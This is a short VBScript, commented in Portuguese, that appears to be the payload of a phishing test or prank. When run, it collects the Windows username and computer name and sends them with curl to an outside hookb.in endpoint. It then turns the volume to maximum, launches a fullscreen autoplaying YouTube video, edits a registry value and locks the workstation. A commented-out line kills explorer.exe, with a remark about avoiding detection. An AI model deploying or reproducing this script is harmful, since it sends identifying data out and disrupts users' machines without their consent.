Option Explicit
Dim i, message, oShell, user, comp, pkgd, curlStr, userB, compB
Set oShell = CreateObject("WScript.shell")

'Coletar dados do usuário
user = oShell.ExpandEnvironmentStrings("%UserName%")
comp = oShell.ExpandEnvironmentStrings("%ComputerName%")
'Corrigir os dados removendo espaços para evitar erros na curlReq
userB = Replace(user, " ", "")
compB = Replace(comp, " ", "")
'Criar o pacote e enviar via Curl para saber quantos clicaram
pkgd = "username=" & userB & "_computerName=" & compB
curlStr = "CMD /C curl --ssl-no-revoke -X GET https://hookb.in/[Hookbin_CODE]?" & pkgd

'Aumentar o volume
For i = 0 To 50
    Call oShell.SendKeys(Chr(175))
Next

'Executar o Chrome com URL como parâmetro (a URL foi editada para tocar automaticamente, e adquirir o comportamento de FullScreen)
oShell.run "CMD /C start chrome.exe https://www.youtube.com/embed/[Video_CODE]?autoplay=1&fullscreen=1&controls=0"

'Maximizar o navegador enviando a tecla F11
oShell.SendKeys "{F11}"
oShell.regWrite "HKEY_CURRENT_USER\Console\Fullscreen", "1", "REG_DWORD"

'Mensagem para o usuário, e envio de dados para registro
oShell.run curlStr

'Matar o explorer.exe pode alertar comportamento malicioso
'oShell.run "Taskkill /IM Explorer.exe /F", 0 ,True
'oShell.run "Explorer.exe"

'Bloqueia a tela do usuário
oShell.Run "%systemroot%\System32\rundll32.exe user32.dll,LockWorkStation", , False

'Encerra o script :)
WScript.Quit